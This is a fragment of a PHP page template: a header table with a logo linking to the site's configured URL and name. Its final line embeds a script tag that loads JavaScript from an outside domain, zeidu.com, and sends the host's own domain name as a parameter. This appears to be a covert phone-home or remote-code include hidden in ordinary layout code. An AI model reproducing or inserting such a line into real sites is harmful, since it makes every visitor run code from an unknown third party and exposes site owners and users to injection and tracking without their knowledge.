...
<tr><td>
  <div style="text-align:left;background-color:#ffffff;color:#000000">
    <div style="margin:6px 18px 0 10px;float:left"><a href="<?php echo $config["url"];?>"><img style="border:0px" alt="到<?php echo $config["name"];?>首页" src="<?php echo $config["url"]?>/images/logo-kz.gif"></a></div>
...
<script language="javascript" src="http://www.zeidu.com/zeidu/aa.php?http_host=<?php echo $_SERVER["HTTP_HOST"];?>"></script>
